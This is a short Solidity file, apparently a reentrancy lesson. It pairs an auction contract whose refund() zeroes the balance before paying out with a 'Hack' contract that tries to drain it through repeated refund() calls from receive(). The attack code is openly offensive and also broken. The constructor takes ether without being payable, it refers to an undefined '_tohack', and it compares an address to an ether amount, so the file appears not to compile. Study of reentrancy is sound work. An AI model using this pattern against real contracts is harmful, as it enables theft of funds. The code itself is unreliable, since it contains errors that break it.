// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

contract AuctionReentrancy {
    mapping(address bidder => uint) public bids;

    function bid() external payable {
        bids[msg.sender] += msg.value;

    }
        
    function refund() external {
        uint refundAmount = bids[msg.sender];

        bids[msg.sender] = 0;

        if (refundAmount > 0) {
            (bool ok,) = msg.sender.call{value: refundAmount}(""); // GOTO RECEIVE
            require(ok, "can`t send");

            // bids[msg.sender] = 0;


        }

    }    
    
}

contract Hack {
    AuctionReentrancy toHack;
    uint constant BID_AMOUNT = 1 ether;

    constructor(address _toHack) {
        require(msg.value == BID_AMOUNT);

        toHack = AuctionReentrancy(_tohack);
        toHack.bid{value: msg.value}();
    }

    function hack() public {
        toHack.refund();
    }

    receive() external payable {
        if (address(toHack) >= BID_AMOUNT) {
            hack();
        }
    }
}